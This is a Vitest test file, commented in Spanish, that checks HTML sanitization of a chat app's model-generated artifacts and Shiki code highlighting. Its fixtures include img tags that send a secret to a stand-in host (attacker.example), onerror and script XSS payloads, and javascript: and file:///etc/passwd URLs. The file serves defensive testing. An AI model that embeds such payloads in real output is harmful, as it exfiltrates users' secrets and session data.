/**
 * T3 (Ola 1b) / EGO-FIND-61 — Sanitización del HTML del chat + CSP `img-src`.
 *
 * RED primero.
 *
 * HALLAZGO (medido, no inferido): el chat NO usa `react-markdown`. El
 * renderizador de Markdown (`components/assistant-ui/markdown-text.tsx`) es un
 * parser propio que emite **nodos de texto de React** (auto-escapados) y
 * bloques `<pre>`: no hay inyección de HTML en esa ruta.
 *
 * Los dos puntos donde SÍ entra HTML al DOM del renderer son:
 *  1. `components/assistant-ui/shiki-highlight.tsx` → `dangerouslySetInnerHTML`
 *     con el HTML que produce nuestro worker de Shiki.
 *  2. `components/assistant-ui/artifact-card.tsx` → `<iframe srcDoc={...}>`
 *     con el artifact HTML/SVG generado por el modelo.
 *
 * El (2) es el vector de exfiltración real: un artifact con
 * `<img src="https://attacker.example/?x=<secreto>">` hace que el renderer
 * pida esa URL (con las cookies/token de la sesión en el `Referer`).
 *
 * ## EGO-FIND-63 (Ola 11)
 * Los cuatro últimos tests eran **asertos de texto de fuente** ("el fichero
 * contiene `sanitizeShikiHtml`"): no fallan cuando el producto se rompe,
 * sólo cuando alguien reescribe el fichero. Ahora:
 *  - los tres primeros se comprueban por **COMPORTAMIENTO** (se renderiza y
 *    se mira el DOM que sale);
 *  - la CSP del `index.html` es un **contrato de configuración** (jsdom no
 *    aplica la CSP) → vive en el lint-test de contratos de fuente:
 *    `pnpm --filter @ego/desktop lint:source-contracts`.
 */
import { describe, it, expect, afterEach } from "vitest";
import { render, cleanup } from "@testing-library/react";
import {
  sanitizeArtifactHtml,
  sanitizeShikiHtml,
  isRemoteResource,
} from "../lib/sanitize-html.js";
import { MarkdownText } from "../components/assistant-ui/markdown-text.js";
import { ShikiHighlight } from "../components/assistant-ui/shiki-highlight.js";

afterEach(() => {
  cleanup();
});

describe("T3: sanitización del HTML del chat (DOMPurify)", () => {
  it("el artifact NO conserva imágenes remotas (vector de exfiltración)", () => {
    const dirty = `<div><img src="https://attacker.example/?x=SECRETO" onerror="alert(1)"><p>hola</p></div>`;
    const clean = sanitizeArtifactHtml(dirty);
    expect(clean).not.toContain("attacker.example");
    expect(clean).not.toContain("onerror");
  });

  it("el HTML del artifact se sanea conservando el marcado propio", () => {
    const dirty = `<img src="https://attacker.example/?x=SECRETO"><img src="//attacker.example/y"><a href="https://attacker.example">z</a>`;
    const clean = sanitizeArtifactHtml(dirty);
    expect(clean).not.toMatch(/https?:/);
    expect(clean).not.toMatch(/src="\/\//);
    expect(clean).not.toMatch(/href="https?:/);
  });

  it("el HTML de Shiki se sanea conservando el marcado del tema", () => {
    const dirty = `<pre class="shiki" style="background:#0d1117"><code><span class="line">const a = 1;</span></code></pre><script>alert(1)</script>`;
    const clean = sanitizeShikiHtml(dirty);
    expect(clean).toContain("shiki");
    expect(clean).toContain("const a = 1;");
    expect(clean).not.toContain("<script");
  });

  it("el regex de recursos remotos detecta URLs absolutas y protocol-relative", () => {
    expect(isRemoteResource("https://attacker.example/x")).toBe(true);
    expect(isRemoteResource("http://attacker.example/x")).toBe(true);
    expect(isRemoteResource("//attacker.example/x")).toBe(true);
    expect(isRemoteResource("javascript:alert(1)")).toBe(true);
    expect(isRemoteResource("file:///etc/passwd")).toBe(true);
    expect(isRemoteResource("local.png")).toBe(false);
    expect(isRemoteResource("/assets/x.png")).toBe(false);
    expect(isRemoteResource("./x.png")).toBe(false);
    expect(isRemoteResource("data:image/png;base64,iVBORw0KGgo=")).toBe(false);
    // Un SVG embebido puede llevar script: NO es local.
    expect(isRemoteResource("data:image/svg+xml;base64,PHN2Zz4=")).toBe(true);
  });

  /* ------------------------------------------------------------------ *
   * EGO-FIND-63 (Ola 11) — por COMPORTAMIENTO, no por texto de fuente
   * ------------------------------------------------------------------ */

  it("el Markdown del chat escapa el HTML: no inyecta nodos ni URLs", () => {
    // El render de Markdown emite nodos de texto de React: el HTML del
    // modelo llega como TEXTO, nunca como markup.
    const { container } = render(
      <MarkdownText text={'<img src="https://attacker.example/?x=SECRETO"><b>negrita</b>'} />
    );
    // No hay ningún elemento inyectado del HTML del modelo…
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("b")).toBeNull();
    // …y el texto sí está (escapado).
    expect(container.textContent).toContain("attacker.example");
    expect(container.textContent).toContain("negrita");
  });

  it("el HTML de Shiki que llega al DOM no lleva scripts (pasa por el sanitizador)", () => {
    const { container } = render(
      <ShikiHighlight code={"const a = 1;"} language="typescript" streaming={false} />
    );
    // Aunque el worker devolviera un `<script>`, al DOM no llega.
    expect(container.querySelector("script")).toBeNull();
    // Y el sanitizador (la función que lo garantiza) elimina el script.
    expect(sanitizeShikiHtml("<pre>x</pre><script>alert(1)</script>")).not.toContain(
      "<script"
    );
  });
});
